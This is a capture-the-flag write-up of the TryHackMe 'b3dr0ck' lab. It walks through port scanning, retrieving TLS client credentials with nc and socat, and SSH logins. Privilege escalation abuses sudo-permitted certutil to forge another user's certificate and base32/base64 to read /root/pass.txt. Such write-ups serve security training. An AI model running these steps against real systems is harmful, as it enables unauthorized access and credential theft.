---
title: TryHackme - b3dr0ck
date: 2022-09-04 22:19:00 +0100
categories: [TryHackMe]
tags: [TryHackMe, socat]
render_with_liquid: false
---

# b3dr0ck

# recon

I added the machine’s IP to my `/etc/hosts` as `bedrock.thm` then ran an `nmap` scan to find `ssh` and `http` ports open

```bash
$ sudo nmap bedrock.thm  -v
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9009/tcp open  pichat
```

besides the box had a helpful description

```bash
Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble. Here's what we know...

		- He was able to establish nginx on port 80,  redirecting to a custom TLS webserver on port 4040
		- There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate)
    - There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service
    Can you find all the Easter eggs?

```

so now I know there are 4 open ports on the box

## http

the website had nothing interesting besides this note

```bash
Welcome to ABC!

Abbadabba Broadcasting Compandy

We're in the process of building a website! Can you believe this technology exists in bedrock?!?

Barney is helping to setup the server, and he said this info was important...

Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
Bamm Bamm tried to setup a sql database, but I don't see it running.
Looks like it started something else, but I'm not sure how to turn it off...

He said it was from the toilet and OVER 9000!

Need to try and secure connections with certificates...
```

so I went to check port 9009, which gave me a private key (the commands were guessed based on what the text was saying) and a certificate to connect to a service running on a higher port

```bash
$ nc bedrock.thm 9009
__          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               
What are you looking for? help
Looks like the secure login service is running on port: 54321

Try connecting using:
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
What are you looking for? key

Sounds like you forgot your private key. Let's find it for you...
-----BEGIN RSA PRIVATE KEY-----
[REDACTED KEY]
-----END RSA PRIVATE KEY-----
What are you looking for? cert
Sounds like you forgot your certificate. Let's find it for you...
-----BEGIN CERTIFICATE-----
[REDACTED CERTIFICATE]
-----END CERTIFICATE-----

What are you looking for?
```

after saving the key and the cert to a file I connected to port 54321 which gave me the `barney`'s ssh password

```bash
$ socat stdio ssl:bedrock.thm:54321,cert=cert.pem,key=private.key,verify=0

 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'Barney Rubble' is authorized.
b3dr0ck> help
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
b3dr0ck> user
Current user = 'Barney Rubble' (valid peer certificate)
b3dr0ck> ^C
$ ssh barney@bedrock.thm
barney@bedrock.thm's password: 
barney@b3dr0ck:~$ ls -a
.  ..  barney.txt  .bash_history  .bash_logout  .bashrc  .cache  .hushlogin  .profile  .viminfo
barney@b3dr0ck:~$ cat barney.txt 
THM{RADACTED}
```

# privilege escalation

after getting on the machine I found that user have can run `/usr/bin/certutil` with root, the program take the user first and last name as input, and gives some sort of private key and a certificate

```bash
barney@b3dr0ck:~$ sudo -l
Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil
barney@b3dr0ck:~$ sudo /usr/bin/certutil

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]

barney@b3dr0ck:~$
```

now I needed the full name of another user, viewing the content of `/etc/password` reveled the other name which is `Fred Flintstone`

```bash
barney@b3dr0ck:~$ sudo /usr/bin/certutil fred 'Fred Flintstone'
Generating credentials for user: fred (Fred Flintstone)
Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem
Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
[REDACTED PRIVATE KEY]
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
[REDACTED CERTIFICATE]
-----END CERTIFICATE-----
```

I used the private key and the cert to connect to the service running at port 54321 again, this time to get `fred`'s ssh password

```bash
$ socat stdio ssl:bedrock.thm:54321,cert=fred_cert.pem,key=fred_private.key,verify=0

 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'Fred Flintstone' is authorized.
b3dr0ck> user
Current user = 'Fred Flintstone' (valid peer certificate)
b3dr0ck> help
Password hint: [REDACTED] (user = 'Fred Flintstone')
b3dr0ck> ^C
$ ssh fred@bedrock.thm 
fred@bedrock.thm's password: 
fred@b3dr0ck:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .cache  fred.txt  .hushlogin  .profile  .selected_editor  .ssh  .viminfo
fred@b3dr0ck:~$ cat fred.txt 
THM{REDACTED}
```

this user could run exfiltrate a hash of the `root`'s password with `/usr/bin/base32` 

```bash
fred@b3dr0ck:~$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
fred@b3dr0ck:~$ sudo /usr/bin/base32 /root/pass.txt | base32 -d | base32 -d | base64 -d
[REDACTED]
```

I used crackstation to the clear text password then successfully logged in as root (btw the password wasn’t in rockyou.txt which is a first xd)

```bash
fred@b3dr0ck:~$ su -
Password: 
root@b3dr0ck:~# ls -a
.  ..  .bash_history  .bashrc  pass.txt  .profile  root.txt  snap  .ssh  .viminfo
root@b3dr0ck:~# cat root.txt 
THM{REDACTED}
root@b3dr0ck:~#
```

---
